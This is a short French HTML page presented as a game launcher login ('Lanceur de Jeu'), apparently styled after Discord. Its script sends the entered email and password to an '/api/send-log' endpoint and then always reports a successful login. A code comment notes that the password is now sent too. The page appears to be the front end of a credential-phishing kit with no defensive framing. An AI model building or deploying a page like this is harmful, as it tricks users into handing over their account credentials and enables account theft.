<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion au Jeu</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        form { background: #2a2a2a; padding: 25px; border-radius: 12px; display: flex; flex-direction: column; gap: 15px; width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h2 { text-align: center; margin-top: 0; color: #5865F2; }
        input { padding: 12px; border-radius: 6px; border: 1px solid #444; background: #333; color: white; outline: none; }
        button { padding: 12px; background: #5865F2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        button:active { background: #4752c4; }
    </style>
</head>
<body>
    <form id="loginForm">
        <h2>Lanceur de Jeu</h2>
        <input type="text" id="email" placeholder="Email ou Pseudo" required>
        <input type="password" id="password" placeholder="Mot de passe" required>
        <button type="submit">Se connecter</button>
    </form>

    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // On envoie l'email ET le password maintenant
            await fetch('/api/send-log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email, password: password })
            });

            alert("Connexion r√©ussie !");
        };
    </script>
</body>
</html>
